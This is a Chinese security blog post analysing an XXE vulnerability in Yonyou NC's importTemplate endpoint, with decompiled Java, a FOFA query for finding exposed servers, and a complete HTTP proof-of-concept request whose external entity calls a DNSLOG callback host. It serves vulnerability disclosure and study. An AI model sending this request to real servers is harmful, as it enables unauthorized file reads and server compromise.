---
title: "用友NC importTemplate XML实体注入（XXE）漏洞"
source: https://mrxn.net/jswz/yonyou-nc-portaltemplate-importTemplate-xxe.html
asset_dir: assets/用友nc-importtemplate-xml实体注入（xxe）漏洞
---

# 用友NC importTemplate XML实体注入（XXE）漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/24 08:32
* 1114浏览
* [0评论](#comment)
* 49分钟阅读

深入探索

在线安全工具

技术文章订阅

SQL注入检测工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B) NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC `importTemplate` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件，进一步利用可导致服务器失陷。

代码安全审计

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

根据官方漏洞通告：

[![用友NC importTemplate XML实体注入（XXE）漏洞](images/img-001-fdd60df16b5c.webp)](https://image.mrxn.net/3032e51861a540b2a370fb347e000742.webp)

`portal/pt/portaltemplate/importTemplate` 接口存在xml注入漏洞,从而窃取服务器敏感信息。结合用友NC的路由文件结构，可知接口所在文件为 `PortalTemplate` ，直接搜索相关文件，得到业务逻辑如下

漏洞预警服务

深入探索

JSON处理工具

Windows安全工具

安全认证考试

```
package nc.uap.portal.action;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;
import nc.uap.ctrl.pa.tools.TemplateOperTools;
import nc.uap.lfw.core.AppInteractionUtil;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.log.PortalLogger;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.web.multipart.MultipartException;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;
import org.springframework.web.multipart.MultipartResolver;
import org.springframework.web.multipart.commons.CommonsMultipartResolver;

@Servlet(path="/portaltemplate")
public class PortalTemplateAction
extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Action
    public void importTemplate() throws IOException {
        MultipartHttpServletRequest req = PortalTemplateAction.getMultipartResolver(this.request);
        Map fileMap = req.getFileMap();
        ArrayList files = new ArrayList();
        String billitem = req.getParameter("billitem");
        if ("null".equals(billitem) || StringUtils.isBlank((String)billitem)) {
            AppInteractionUtil.showMessageDialog((String)NCLangRes4VoTransl.getNCLangRes().getStrByID("bd", "PortalTemplateAction-000000"));
            return;
        }
        if (MapUtils.isNotEmpty((Map)fileMap)) {
            files.addAll(fileMap.values());
        }
        String name = ((MultipartFile)files.get(0)).getOriginalFilename();
        InputStream in = ((MultipartFile)files.get(0)).getInputStream();
        try {
            TemplateOperTools.doImPort((InputStream)in, (String)billitem);
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("bd", "PortalTemplateAction-000001") + name + NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000003"));
        }
        catch (Throwable e) {
            PortalLogger.error((String)e.getMessage(), (Throwable)e);
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000005") + e.getMessage());
        }
        finally {
            IOUtils.closeQuietly((InputStream)in);
        }
    }

    private static MultipartHttpServletRequest getMultipartResolver(HttpServletRequest request) throws MultipartException {
        ((CommonsMultipartResolver)multipartResolver).setDefaultEncoding("UTF-8");
        return multipartResolver.resolveMultipart(request);
    }
}
```

指定了访问路由 `/portaltemplate` ，而 `importTemplate` 方法里的 `billitem` 通过参数获取值后，经过判断不为空或者null，且同时存在文件上传内容， 则会将二者带入 `TemplateOperTools.doImPort` 函数

```
public static void doImPort(InputStream in, String pk_template) throws IOException, LfwBusinessException {
    String xml = IOUtils.toString((InputStream)in);
    TemplatePackObj packObj = (TemplatePackObj)JaxbMarshalFactory.newIns().encodeXML(TemplatePackObj.class, xml);
    if (packObj == null) {
        throw new LfwBusinessException(" file content illegal ");
    }
    UwTemplateVO tmplate = TemplateOperTools.getQryTmpService().getTemplateVOByPK(pk_template);
    if (tmplate == null || !tmplate.getWindowid().equals(packObj.getId())) {
        throw new LfwRuntimeException("File id is " + packObj.getId() + ",but this template window id is " + tmplate.getWindowid() + "!");
    }
```

使用 `JaxbMarshalFactory.newIns().encodeXML(TemplatePackObj.class, xml)` 对输入的 XML 字符串 (`xml`) 进行解析，并将其转换为 `TemplatePackObj` 对象。

默认情况下，JAXB 底层使用的解析器是允许解析 XML 文档中定义的外部实体的，且 `in` 输入流的内容直接被当作 XML 内容进行解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /portal/pt/portaltemplate/importTemplate?pageId=login&billitem=1 HTTP/1.1
Content-Type: multipart/form-data; boundary=----123456
Host: nc.mrxn.net
X-Forwarded-For: 127.0.0.1

------123456
Content-Disposition: form-data; name="file"; filename="1.png"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe1.test.dnslog.test/xxe_test">%remote;]>
<root/>
------123456--
```

DNSLOG 平台成功收到响应

代码安全审计

[![用友NC importTemplate XML实体注入（XXE）漏洞](images/img-002-c6d262aa142e.webp)](https://image.mrxn.net/c4e77d5320b441efb7a207f0feb4d2ea.webp)

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=679`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#XXE](https://mrxn.net/tag/XXE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC importTemplate XML实体注入（XXE）漏洞](https://mrxn.net/jswz/yonyou-nc-portaltemplate-importTemplate-xxe.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-portaltemplate-importTemplate-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-portaltemplate-importTemplate-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALjElEQVR4Aeyb3XrTyBJFveb935mhvLMUdanbVgjEvhDfqbO1f6qkdMlAgPnvdrv9+pP61X6sZhjT7/ys3vvke3RWRzPqK64uns2vcupfwVrI7/z1v3c5gW0hv9+K25laPbi9+p2rd1zlug7cgK0duHP4xM38uOgzPuQDQGZoQLj9EN59GHV90f5naL5wW0iRq15/AoeFQLYOIz57VEjet8E8RF/xrtsP6YOguvlHaBbSa7brcn1IXh3C9UV9+TOEzIERZ32HhcxCl/ZzJ/DXFuJbA3kL+pegry6H5OX6HSE5dfMzhDELI3cGRHeG+lfxu/37+/21heyHXtd/fgLfXgjkLeuPANF9e+Acd459oroImQdHNNN7IVn972Kf/9151f/thdSQq/7eCRwW4tY7rm5pDvL23fmvX9v3NBC995tTl0PyENTvaH6GZuHcDPMdZ7NLg8dzz87pueKHhZR41etOYFsIZOvwGPujQvL15lRBeM+VVwWjDyO3r7JVEL+uq/RFiA8obVj5KoW6rpKLwP27/vKqILz78o4w5vUhOjxG84XbQopc9foT+K/eiD+pZ48OeSucDeH2Qbi+ugjx5Su0v3CVUYdxJoRXb5W5uq56xiH95sTq/dO6PiGe4pvgYSGQrUOwPydEh6A+jPyZrt/RN6vrnUPuB0fs2WczITN631nufMgcCNoPI1ef4WEhs9Cl/dwJ/AfZHgTd9uoRui8X7ZOLXZeLkPvLxVW/+h7tESEzIai+76lr9Y6QPhjRXPVWyVdYmSp9yDz5Hq9PyP403uD6sBDI9mqjVf0ZIf5Kr54qfUi+tCp4zO3rCNy/V1CHzJEX1vyquq6q632Vti/IDDMQDkGz+qI6JAdBdRGiw4h9jvnCw0JKvOp1J3D4PsRHgWy1875dSO6sbg4e93lf0b7OIXMArQMCw6fLgDNh9NVFGH0YeZ9nn3pHmPdX7vqE1Cm8UX15ITBu17cBokPQrxHCIahun1xUFyF9EDQnmiuEMQPh5e3L3hVC+roP0Z218mHMmRcf9X15IX3Yxf/uCWzfhzi2bxHm2zYPc985HSH53g9z3ZxzIDkI6u/RrKgHYw+M3Fzv6xzSp75CSM658JhX7vqE1Cm8UW2/y+rP5Na7DtmyvgjRV3l183JRHTJHri+qi5A8YOQ0OsOGzoHhd2fdt0+E5CGoLtr/CK9PiKf1JrgtBLJVCPp8bnPFuw5jvz5Eh6C6CNH7/boPyanPEB5nID5w43f1GRD/mQ7JQbA/uxziOw/C4YjbQgxf+NoTOPwua/U4cNwmsIqf1n2LbADuP29DUL8jxLdvj2b32uz6Wa77ctGZKw7zZzQ/w+sT4qm+CW4L6duCc9uFeQ6iO7d/vRBfvec6hzHf+8wXQrIwoj0rhORrRhWEQ9A+CK9MFYTri+VVyVcI6Qdu20Ju14+3OIHDQiDbqs1W9aeE+BCsTJW5uq6Si6XNSh/m8yC6uY4QH9isfp/N+LjQB+6/Xn3ISzBvYMUh82BE+yD6ipd+WEiJV73uBJYLgXGbvhUdITkY0S8Jon+VQ/pW93Pe3of0QNCMaBbiyztCfPsgHILqK3SefufqM1wuZBa+tH9/AsuFuFUY3woIh+DqEe0XIfnOe7++OqRPvvIBIxsC918jeo8BiC9fof0izPv0b7fbfVTnd/HJ/y0X8qTvsv/RCSwXAnkL+pblK1w9p3mYz+195kVInzn1Mwhjb58hF50ph7FfH0YdwiFov2hf5+qFy4XYd